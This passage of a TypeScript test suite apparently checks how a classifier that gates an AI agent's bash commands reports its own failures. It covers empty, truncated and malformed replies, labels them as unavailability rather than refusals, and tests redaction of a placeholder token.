		expect(String(err)).not.toMatch(/"allow"/)
	})

	it("separates an answer that never arrived from one that arrived unreadable", async () => {
		completeSimpleMock.mockResolvedValue(reply([]))
		const empty = await rejectWith({ ...base, stage: "single", pendingTool: { name: "bash", input: { command: "id" } } })
		expect((empty as ClassifierStageFailure).kind).toBe("empty")
		expect((empty as ClassifierStageFailure).reply).toBe("")
	})

	it("names which tool-stage failure it is: no call, or a call with nothing in it", async () => {
		completeSimpleMock.mockResolvedValue(textReply("I will not answer with a tool call"))
		const noCall = await rejectWith({ ...base, stage: "tool", pendingTool: { name: "bash", input: { command: "df -h" } } })
		expect((noCall as ClassifierStageFailure).kind).toBe("no-tool-call")

		completeSimpleMock.mockResolvedValue(
			reply([
				{
					type: "toolCall",
					id: "t1",
					name: CLASSIFIER_TOOL_NAME,
					arguments: { thinking: "hmm", reason: "unsure" },
				},
			]),
		)
		const emptyCall = await rejectWith({ ...base, stage: "tool", pendingTool: { name: "bash", input: { command: "du -sh" } } })
		expect((emptyCall as ClassifierStageFailure).kind).toBe("no-verdict")
		// The arguments are the only thing the model said, so they are what the log line quotes.
		expect((emptyCall as ClassifierStageFailure).reply).toContain("unsure")
	})

	it("charges an XML-stage failure to that stage's own token cap", async () => {
		completeSimpleMock.mockResolvedValue(
			textReply("<block>y es — let me explain: the user never a", "length"),
		)
		const err = await rejectWith({ ...base, stage: "fast", pendingTool: { name: "bash", input: { command: "history | tail" } } })

		const failure = err as ClassifierStageFailure
		expect(failure.stage).toBe("fast")
		expect(failure.kind).toBe("truncated")
		expect(failure.maxTokens).toBe(256)
		expect(failure.message).toContain("classifier stage fast returned unparseable XML/JSON")
	})

	it("attributes every one of them as a transport failure, never as a refusal", async () => {
		completeSimpleMock.mockResolvedValue(textReply("nope", "length"))
		const failure = (await rejectWith({
			...base,
			stage: "single",
			pendingTool: { name: "bash", input: { command: "whoami" } },
		})) as ClassifierStageFailure

		// The value gate-bridge.ts / index.ts put in `classifierWhy` so the deny says "classifier —
		// unavailable", which is the whole point of naming the failure at all.
		expect(failure.classifierWhy).toBe("unavailable")
		expect(failure.message).toContain("the model did not answer")
		expect(failure.message).not.toMatch(/blocked (it|the action)/)
	})

	it("redacts the reply it quotes in the failure", async () => {
		completeSimpleMock.mockResolvedValue(
			textReply('export HF_TOKEN=sk-abcdefghijklmnopqrstuvwxyz "token"', "length"),
		)
		const failure = (await rejectWith({
			...base,
			stage: "single",
			pendingTool: { name: "bash", input: { command: "env" } },
		})) as ClassifierStageFailure

		expect(failure.reply).toContain("sk-[REDACTED]")
		expect(failure.message).not.toContain("sk-abcdefghijklmnopqrstuvwxyz")
	})

	it("carries that cause into the notice the user is shown, still as a transport failure", async () => {
		// The rule at the top of this file — a transport failure is attributed as a transport failure — has to
		// survive the wording change: naming the cause must not turn "could not be asked" into "judged and said no".
		completeSimpleMock.mockResolvedValue(textReply("Let me think about this command. First,", "length"))
		const failure = (await rejectWith({
			...base,
			stage: "single",
			pendingTool: { name: "bash", input: { command: "whoami" } },
		})) as ClassifierStageFailure

		const short = classifierUnavailableReason(failure.message)
		expect(short).toContain("classifier unavailable")
		expect(short).toContain("classifier stage single")
		expect(short).toContain("max_tokens=512")
		expect(short).not.toMatch(/turned this action down|denied/i)

		const notice = buildClassifierUnavailableMessage("bash", "test/test-model", {
			classifierWhy: failure.classifierWhy,
			classifierCause: failure.message,
		})
		expect(notice).toContain("classifier stage single")
		expect(notice).toContain("did not answer")
		expect(notice).not.toMatch(/judged this and said no/)
	})
})

describe("classifier-client helpers (moved from cc-alignment.test.ts)", () => {
	it("parses XML classifier verdict", () => {
		expect(
			parseXmlClassifierVerdict("<block>yes</block><reason>bad</reason>"),
		).toEqual({ allow: false, reason: "bad" })
	})

	it("strips thinking suffix from model ref", () => {
		expect(parseModelRef("anthropic/claude-sonnet-4-5:thinking")).toEqual({
			provider: "anthropic",
			modelId: "claude-sonnet-4-5",
		})
	})

	it("parses classifier stage suffix on model ref", () => {
		expect(parseClassifierModelRef("CPA/Minimax/MiniMax-M2.7@tool")).toEqual({
			provider: "CPA",
			modelId: "Minimax/MiniMax-M2.7",
			stageOverride: "tool",
		})
	})
})
